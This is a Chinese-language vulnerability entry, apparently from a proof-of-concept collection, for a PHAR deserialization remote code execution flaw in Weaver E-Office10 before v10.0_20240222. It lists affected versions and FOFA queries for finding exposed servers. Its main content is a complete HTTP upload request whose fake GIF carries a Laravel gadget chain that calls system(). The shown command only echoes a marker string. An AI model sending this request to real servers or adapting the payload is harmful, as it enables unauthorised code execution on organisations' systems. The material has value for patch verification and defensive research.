## 泛微E-Office10版本小于v10.0_20240222存在远程代码执行漏洞

漏洞的关键在于系统处理上传的PHAR文件时存在缺陷。攻击者能够上传伪装的PHAR文件到服务器，利用PHP处理PHAR文件时自动进行的反序列化机制来触发远程代码执行。

## 影响版本
```
v10.0_20180516 < E-Office10 < v10.0_20240222
```


## fofa
```
app="泛微-EOffice"

body="eoffice_loading_tip" && body="eoffice10"
```


## poc
```
POST /eoffice10/server/public/api/attachment/atuh-file HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 523
Accept: string("*/*")
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=ifedjiqy

--ifedjiqy
Content-Disposition: form-data; name="Filedata"; filename="register.inc"
Content-Type: image/jpeg

GIF89a<?php __HALT_COMPILER(); ?>
D.....................O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:".*.events";O:25:"Illuminate\Bus\Dispatcher":1:{s:16:".*.queueResolver";s:6:"system";}s:8:".*.event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{s:10:"connection";s:37:"echo 9yM86ESyFBXNDwCh6Nbsxy9wrcQrP25P";}}....test.txt....K..f.....~..........test.).i..f3....2pq....>....GBMB
--ifedjiqy--
```

## 漏洞来源
- https://mp.weixin.qq.com/s/45_7Qz8AH1w471rbtFCyjw
- https://mp.weixin.qq.com/s/nXg-2YF-iOMZW4mfDBYJYQ
